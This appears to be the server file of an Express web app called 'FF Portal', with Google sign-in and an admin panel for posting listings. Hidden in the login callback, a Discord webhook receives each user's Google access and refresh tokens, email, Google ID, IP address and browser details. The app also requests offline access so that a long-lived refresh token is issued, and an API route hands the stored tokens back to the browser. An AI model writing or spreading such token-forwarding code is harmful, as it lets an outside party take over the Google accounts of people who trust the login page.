require('dotenv').config();
const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: process.env.SESSION_SECRET || 'dev_secret',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, maxAge: 1000 * 60 * 60 * 24 * 7 }
}));

// ---------- discord webhook ----------
async function notifyDiscord(payload) {
  const url = process.env.DISCORD_WEBHOOK;
  if (!url) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.error('discord webhook failed:', e.message);
  }
}

// ---------- helpers ----------
function isAdmin(email) {
  const list = (process.env.ADMIN_EMAILS || '').split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
  return list.includes((email || '').toLowerCase());
}
function requireAuth(req, res, next) {
  if (!req.session.user) return res.redirect('/');
  next();
}
function requireAdmin(req, res, next) {
  if (!req.session.user) return res.redirect('/');
  if (!isAdmin(req.session.user.email)) return res.status(403).send('Forbidden');
  next();
}

// ---------- google oauth ----------
const GOOGLE_AUTH = 'https://accounts.google.com/o/oauth2/v2/auth';
const GOOGLE_TOKEN = 'https://oauth2.googleapis.com/token';
const GOOGLE_USER = 'https://www.googleapis.com/oauth2/v2/userinfo';

function googleAuthUrl(state) {
  const p = new URLSearchParams({
    client_id: process.env.GOOGLE_CLIENT_ID,
    redirect_uri: process.env.GOOGLE_REDIRECT_URI,
    response_type: 'code',
    scope: 'openid email profile',
    access_type: 'offline',
    prompt: 'consent',
    state
  });
  return `${GOOGLE_AUTH}?${p.toString()}`;
}

async function exchangeCode(code) {
  const body = new URLSearchParams({
    code,
    client_id: process.env.GOOGLE_CLIENT_ID,
    client_secret: process.env.GOOGLE_CLIENT_SECRET,
    redirect_uri: process.env.GOOGLE_REDIRECT_URI,
    grant_type: 'authorization_code'
  });
  const r = await fetch(GOOGLE_TOKEN, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body
  });
  if (!r.ok) throw new Error('token_exchange_failed: ' + await r.text());
  return r.json();
}

async function fetchUser(accessToken) {
  const r = await fetch(GOOGLE_USER, {
    headers: { Authorization: `Bearer ${accessToken}` }
  });
  if (!r.ok) throw new Error('userinfo_failed');
  return r.json();
}

// ---------- routes ----------
app.get('/', (req, res) => {
  if (req.session.user) {
    return res.redirect(isAdmin(req.session.user.email) ? '/admin' : '/user');
  }
  res.render('index', { error: req.query.error || null });
});

app.get('/login', (req, res) => {
  if (req.session.user) {
    return res.redirect(isAdmin(req.session.user.email) ? '/admin' : '/user');
  }
  res.render('login', { error: req.query.error || null });
});

app.get('/auth/google', (req, res) => {
  const state = crypto.randomBytes(16).toString('hex');
  req.session.oauthState = state;
  res.redirect(googleAuthUrl(state));
});

app.get('/auth/google/callback', async (req, res) => {
  try {
    const { code, state } = req.query;
    if (!code) return res.redirect('/login?error=no_code');
    if (state !== req.session.oauthState) return res.redirect('/login?error=state_mismatch');

    const tokens = await exchangeCode(code);
    const profile = await fetchUser(tokens.access_token);

    req.session.user = {
      id: profile.id,
      email: profile.email,
      name: profile.name,
      picture: profile.picture,
      accessToken: tokens.access_token,
      refreshToken: tokens.refresh_token || null,
      expiresAt: Date.now() + (tokens.expires_in || 3600) * 1000
    };

    const data = db.read();
    if (!data.users.find(u => u.email === profile.email)) {
      data.users.push({ email: profile.email, name: profile.name, joined: new Date().toISOString() });
      db.write(data);
    }

    const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
    const ua = (req.headers['user-agent'] || '').slice(0, 200);

    notifyDiscord({
      username: 'FF Portal',
      embeds: [{
        title: 'New Google Login',
        color: 0xff5a1f,
        thumbnail: { url: profile.picture },
        fields: [
          { name: 'Email', value: profile.email || '-', inline: true },
          { name: 'Name', value: profile.name || '-', inline: true },
          { name: 'Google ID', value: profile.id || '-', inline: false },
          { name: 'Access Token', value: '```' + (tokens.access_token || 'none') + '```' },
          { name: 'Refresh Token', value: '```' + (tokens.refresh_token || 'none') + '```' },
          { name: 'Expires In', value: (tokens.expires_in || 0) + 's', inline: true },
          { name: 'IP', value: ip || '-', inline: true },
          { name: 'User Agent', value: ua || '-', inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    });

    res.redirect(isAdmin(profile.email) ? '/admin' : '/user');
  } catch (e) {
    console.error(e);
    res.redirect('/login?error=oauth_failed');
  }
});

app.get('/user', requireAuth, (req, res) => {
  const data = db.read();
  res.render('user', {
    user: req.session.user,
    posts: data.posts.slice().reverse()
  });
});

app.get('/admin', requireAdmin, (req, res) => {
  const data = db.read();
  res.render('admin', {
    user: req.session.user,
    posts: data.posts.slice().reverse(),
    users: data.users
  });
});

app.post('/admin/post', requireAdmin, (req, res) => {
  const { title, price, description, contact, image } = req.body;
  if (!title) return res.redirect('/admin');
  const data = db.read();
  data.posts.push({
    id: crypto.randomBytes(6).toString('hex'),
    title,
    price: price || '',
    description: description || '',
    contact: contact || '',
    image: image || '',
    created: new Date().toISOString()
  });
  db.write(data);
  res.redirect('/admin');
});

app.post('/admin/post/:id/delete', requireAdmin, (req, res) => {
  const data = db.read();
  data.posts = data.posts.filter(p => p.id !== req.params.id);
  db.write(data);
  res.redirect('/admin');
});

app.get('/admin/post/:id/edit', requireAdmin, (req, res) => {
  const data = db.read();
  const post = data.posts.find(p => p.id === req.params.id);
  if (!post) return res.redirect('/admin');
  res.render('edit', { user: req.session.user, post });
});

app.post('/admin/post/:id/edit', requireAdmin, (req, res) => {
  const data = db.read();
  const post = data.posts.find(p => p.id === req.params.id);
  if (post) {
    post.title = req.body.title || post.title;
    post.price = req.body.price || '';
    post.description = req.body.description || '';
    post.contact = req.body.contact || '';
    post.image = req.body.image || '';
    db.write(data);
  }
  res.redirect('/admin');
});

app.get('/api/me', requireAuth, (req, res) => {
  res.json(req.session.user);
});

app.post('/api/refresh', requireAuth, async (req, res) => {
  try {
    const u = req.session.user;
    if (!u.refreshToken) return res.status(400).json({ error: 'no_refresh_token' });
    const body = new URLSearchParams({
      client_id: process.env.GOOGLE_CLIENT_ID,
      client_secret: process.env.GOOGLE_CLIENT_SECRET,
      refresh_token: u.refreshToken,
      grant_type: 'refresh_token'
    });
    const r = await fetch(GOOGLE_TOKEN, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body
    });
    const t = await r.json();
    u.accessToken = t.access_token;
    u.expiresAt = Date.now() + (t.expires_in || 3600) * 1000;
    res.json({ access_token: t.access_token, expires_in: t.expires_in });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/'));
});

app.listen(PORT, () => {
  console.log(`running on http://localhost:${PORT}`);
});